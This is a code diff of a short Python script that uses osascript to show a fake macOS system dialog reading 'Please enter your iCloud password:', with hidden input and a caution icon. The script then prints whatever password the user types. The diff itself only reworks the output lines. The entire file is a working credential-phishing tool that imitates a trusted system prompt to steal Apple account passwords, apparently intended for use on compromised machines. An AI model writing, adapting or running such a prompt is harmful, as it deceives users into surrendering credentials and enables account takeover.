@@ -1,9 +1,7 @@
 import subprocess
-
 import sys
 
 '''Generates native osx popup asking for user password.'''
-
 
 applescript = """
 set my_password to display dialog "Please enter your iCloud password:" with title "Password" with icon caution default answer "" buttons {"Cancel", "OK"} default button 2 giving up after 295 with hidden answer
@@ -21,6 +19,6 @@ proc = subprocess.Popen(['osascript', '-'],
                         stderr=subprocess.PIPE)
 
 out, err = proc.communicate(applescript)
-print "Error: {}".format(err[:-1]) if err else "Password: {}".format(out[:-1])
 
-
+sys.stderr.write(err[:-1])
+sys.stdout.write("Password: {}".format(out[:-1]))
